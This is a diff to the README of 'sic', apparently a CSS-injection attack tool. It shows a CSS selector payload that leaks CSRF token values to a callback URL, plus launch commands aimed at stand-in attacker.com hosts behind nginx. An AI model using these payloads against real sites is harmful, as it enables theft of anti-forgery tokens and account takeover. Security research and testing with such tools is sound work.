@@ -66,12 +66,12 @@ input[name=csrf][value^={{:token:}}] { background: url({{:callback:}}); }
 `sic` will automatically generate all of the payloads required for your attack and make sure it's pointing to the right callback urls.
 
 ### HTTPS
-I didn't bake official HTTPS support into the tool but made it possible to potentially use nginx as a reverse proxy. I haven't validated that this will work or not, but I don't really see a reason why it wouldn't. 
+HTTPS is not directly support via `sic`; however, it's possible to use a tool like nginx to set up a reverse proxy in front of `sic`. An example configuration is found in the [example nginx config](/example_nginx.conf) file thoughtfully crafted up by [nbk_2000](https://twitter.com/nbk_2000).
 
-Assuming you have configured nginx to forward port 3000 -> 4000 and 3001 -> 4001 then you might launch the tool as follows:
+After nginx is configured, you would run `sic` using a command similar to the following:
 
 ```
-./sic -p 4000 --ph "https://attacker.com:3000" --ch "https://attacker.com:3001" -t my_template_file
+./sic -p 3000 --ph "https://a.attacker.com" --ch "https://b.attacker.com" -t template_file
 ```
 
 Note that the ports on `--ph` and `--ch` match up with the ports nginx is serving and not `sic`. 
